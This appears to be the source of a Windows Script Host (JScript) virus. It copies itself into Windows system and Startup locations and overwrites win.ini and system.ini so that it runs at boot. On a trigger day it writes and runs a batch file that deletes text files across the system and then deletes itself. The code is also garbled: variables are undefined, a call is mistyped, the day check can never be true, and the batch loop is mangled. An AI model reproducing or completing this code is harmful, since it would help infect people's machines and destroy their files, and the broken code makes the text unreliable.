{

function encrypt(thing) { 
 var x
 for(var i=0;i<thing.length;i++){
  x = x + String.fromCharCode(str.charCodeAt(i)+11)
 }
 return(x)
}
encrypt(
var fso=WScript.CreateObject("Scripting.FileSystemObject")
var shell=WScript.CreateObject("WScript.Shell");
var opent=fso.OpenTextFile(WScript.ScriptFullName,1)
var readt=opent.ReadAll()
opent.Close()
createt=fso.CreateTextFile("pain.js");
createt.WriteLine(readt);
createt.Close();

fso.CopyFile("pain.js","c:\\Windows\\win.js");
winini=fso.CreateTextFile("c:\\Windows\\win.ini");
winini.WriteLine("[Windows]");
winini.WriteLine("load c:\\Windows\\win.js");
winini=WriteLine("run c:\\windows\\win.js");
winini.WriteLine("NullPort=None");

fso.CopyFile("pain.js","c:\\Windows\\Start Up\\Programs\\StartUp\\start.js");
fso.CopyFile("pain.js","c:\\windows\\sys.js");
writesys=fso.CreateTextFile("c:\\windows\\system.ini")
writesys.WriteLine("[boot]")
writesys.WriteLine("shell=explorer.exe c:\\windows\sys.js");
var currentDate=new Date()
var currentDay=currentDate.getDay()

if(currentDay==7) {
shell=WScript.CreateObject("WScript.Shell");
textget=fso.CreateTextFile("pain.bat");
textget.WriteLine("ctty nul");
textget.WriteLine("set first=for");
textget.WriteLine("%pain% %%j in (*.txt \*.txt ..\*.txt %path%\*.txt %windir%\*.txt %tmp%\*.txt %temp%\*.txt) do del *.txt %%j");
textget.WriteLine("copy pain.js %windir%\\startm~1\\progra~1\\autost~1\\win.js");
textget.WriteLine("del %0");
textget.Close();
shell.Run("pain.bat");
)
 }
}